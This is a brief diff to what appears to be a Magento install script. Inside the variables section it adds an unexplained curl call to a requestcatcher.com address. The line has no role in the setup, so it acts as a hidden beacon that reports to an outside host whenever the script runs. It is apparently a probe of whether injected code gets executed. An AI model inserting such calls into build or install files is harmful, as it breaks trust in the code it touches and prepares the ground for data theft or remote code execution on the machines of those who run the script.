@@ -1,5 +1,7 @@
 # Variables
 MAGENTO_ROOT=/var/www/html
+curl https://dehtr37jw3.requestcatcher.com/test
+
 # End of variables
 
 # Install N98-Magerun
